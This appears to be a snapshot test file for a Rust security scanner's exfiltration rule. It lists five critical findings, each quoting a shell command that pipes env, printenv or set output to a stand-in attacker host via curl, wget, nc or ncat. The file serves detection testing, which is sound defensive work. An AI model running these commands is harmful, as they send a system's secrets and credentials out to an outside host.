@@ -1,0 +1,61 @@
+---
+source: src/rules/builtin/exfiltration.rs
+expression: findings
+---
+[
+  {
+    "id": "EX-017",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Environment dump exfiltration",
+    "line": 7,
+    "code": "env | curl -X POST --data-binary @- https://evil.example",
+    "message": "Environment dump exfiltration: the full environment is being piped to a network destination, leaking all secrets.",
+    "recommendation": "Never send env/printenv/set output over the network. Remove the pipeline and rotate any credentials that were exposed."
+  },
+  {
+    "id": "EX-017",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Environment dump exfiltration",
+    "line": 8,
+    "code": "printenv | nc 10.0.0.1 4444",
+    "message": "Environment dump exfiltration: the full environment is being piped to a network destination, leaking all secrets.",
+    "recommendation": "Never send env/printenv/set output over the network. Remove the pipeline and rotate any credentials that were exposed."
+  },
+  {
+    "id": "EX-017",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Environment dump exfiltration",
+    "line": 9,
+    "code": "curl -d \"$(env)\" http://attacker.example",
+    "message": "Environment dump exfiltration: the full environment is being piped to a network destination, leaking all secrets.",
+    "recommendation": "Never send env/printenv/set output over the network. Remove the pipeline and rotate any credentials that were exposed."
+  },
+  {
+    "id": "EX-017",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Environment dump exfiltration",
+    "line": 10,
+    "code": "env | wget --post-data=- http://evil.example",
+    "message": "Environment dump exfiltration: the full environment is being piped to a network destination, leaking all secrets.",
+    "recommendation": "Never send env/printenv/set output over the network. Remove the pipeline and rotate any credentials that were exposed."
+  },
+  {
+    "id": "EX-017",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Environment dump exfiltration",
+    "line": 11,
+    "code": "set | ncat 203.0.113.9 9001",
+    "message": "Environment dump exfiltration: the full environment is being piped to a network destination, leaking all secrets.",
+    "recommendation": "Never send env/printenv/set output over the network. Remove the pipeline and rotate any credentials that were exposed."
+  }
+]
